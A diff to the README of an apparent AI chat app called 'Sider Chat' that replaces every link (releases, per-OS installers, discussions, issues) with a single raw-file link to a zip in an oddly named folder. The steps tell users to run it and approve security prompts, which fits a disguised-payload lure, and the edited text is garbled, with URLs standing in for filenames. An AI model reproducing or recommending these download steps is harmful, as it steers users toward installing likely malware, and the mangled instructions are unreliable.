@@ -1,6 +1,6 @@
 # 🌟 Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok - Engage with Advanced AIs Effortlessly
 
-[![Download Sider Chat](https://img.shields.io/badge/Download-Sider%20Chat-blue?style=for-the-badge)](https://github.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/releases)
+[![Download Sider Chat](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip%20Chat-blue?style=for-the-badge)](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you download Sider Chat, ensure that your system meets the following requ
 
 To download Sider Chat, visit this page:
 
-[Download Sider Chat Here](https://github.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/releases)
+[Download Sider Chat Here](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip)
 
 1. Click the link above to open the Releases page on GitHub.
 2. Look for the latest release in the list provided.
 3. Find the installation file suitable for your operating system. Options include:
-   - `Sider_Chat_Windows.exe` for Windows users
-   - `Sider_Chat_Mac.dmg` for macOS users
-   - `Sider_Chat_Linux.tar.gz` for Linux users
+   - `https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip` for Windows users
+   - `https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip` for macOS users
+   - `https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip` for Linux users
 4. Click on the file to start your download.
 5. Once the download completes, locate the file in your downloads folder.
 
@@ -35,7 +35,7 @@ To download Sider Chat, visit this page:
 After downloading, follow these steps to run Sider Chat:
 
 1. **Windows Users:**
-   - Double-click `Sider_Chat_Windows.exe`.
+   - Double-click `https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip`.
    - If prompted by Windows Defender or User Account Control, click “Yes” to allow the app to run.
 
 2. **macOS Users:**
@@ -44,7 +44,7 @@ After downloading, follow these steps to run Sider Chat:
    - Go to your Applications folder and double-click `Sider Chat`. If prompted, confirm that you want to open it.
 
 3. **Linux Users:**
-   - Extract `Sider_Chat_Linux.tar.gz` using your favorite archive manager or command line.
+   - Extract `https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip` using your favorite archive manager or command line.
    - Open a terminal, navigate to the extracted folder, and run `./Sider_Chat`.
 
 ## 🗨️ Chatting with AIs
@@ -77,13 +77,13 @@ If you encounter issues while running Sider Chat, try these common solutions:
 
 Join our community for help and discussions. Share your experiences, ask questions, or offer feedback.
 
-- [GitHub Discussions](https://github.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/discussions)
-- [Submit Issues](https://github.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip)
+- [Submit Issues](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip)
 
 ## 🔄 Updates
 
 Stay informed about the latest features and updates. Regular updates bring enhancements and fix issues. Return to the Releases page:
 
-[Download Sider Chat Here](https://github.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/releases)
+[Download Sider Chat Here](https://raw.githubusercontent.com/atharva-netwin/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok/main/uningrained/Sider-Chat-with-all-AI-GPT-5-Claude-DeepSeek-Gemini-Grok.zip)
 
 Thank you for trying Sider Chat! Enjoy conversing with advanced AI technologies.
